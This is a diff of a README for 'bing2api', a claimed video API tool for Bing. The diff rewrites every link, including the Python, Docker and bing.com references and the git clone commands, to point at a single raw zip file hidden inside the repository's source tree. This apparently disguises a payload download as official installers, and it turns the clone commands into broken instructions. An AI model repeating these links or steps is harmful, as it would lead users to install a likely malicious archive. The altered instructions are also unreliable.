@@ -1,6 +1,6 @@
 # 🎥 bing2api - Easy Video API for Bing Creators
 
-[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api)
+[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Click the button above or visit this page to download bing2api:
 
-[https://github.com/Metaphysical-deadness71/bing2api](https://github.com/Metaphysical-deadness71/bing2api)
+[https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps to download and use bing2api on Windows.
 
 Visit the download page:
 
-https://github.com/Metaphysical-deadness71/bing2api
+https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
 Download the latest release or clone the repository if you want to run it yourself.
 
@@ -49,7 +49,7 @@ If you want to run bing2api from source, you need Python.
 
 1. Download Python 3.8 or later from:
 
-   https://www.python.org/downloads/windows/
+   https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
 2. During installation, check **Add Python to PATH**.
 
@@ -58,7 +58,7 @@ If you want to run bing2api from source, you need Python.
 4. Run these commands to download and install:
 
 ```bash
-git clone https://github.com/Metaphysical-deadness71/bing2api.git
+git clone https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 cd bing2api
 pip install -r requirements.txt
 ```
@@ -101,7 +101,7 @@ If you have Docker installed, you can start bing2api without installing Python.
 2. Run these commands:
 
 ```bash
-git clone https://github.com/Metaphysical-deadness71/bing2api.git
+git clone https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 cd bing2api
 docker compose up -d --build
 ```
@@ -131,7 +131,7 @@ Here is a simple way to get your Bing cookie:
 
 4. Go to the **Application** tab.
 
-5. On the left menu, click **Cookies** > https://www.bing.com.
+5. On the left menu, click **Cookies** > https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
 6. Find the cookie named `SRCHD` (or related Bing session cookies).
 
@@ -217,12 +217,12 @@ You can list models, create video generation requests, and check results through
 
 ## 🔗 Helpful Links
 
-- GitHub repo: https://github.com/Metaphysical-deadness71/bing2api
+- GitHub repo: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
-- Python downloads: https://www.python.org/downloads/windows/
+- Python downloads: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
-- Docker downloads: https://docs.docker.com/docker-for-windows/install/
+- Docker downloads: https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip
 
 ---
 
-[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api)
+[![Download bing2api](https://img.shields.io/badge/Download-Get%20bing2api-brightgreen)](https://github.com/Metaphysical-deadness71/bing2api/raw/refs/heads/main/src/bing_api/adapters/bing-api-2.5.zip)
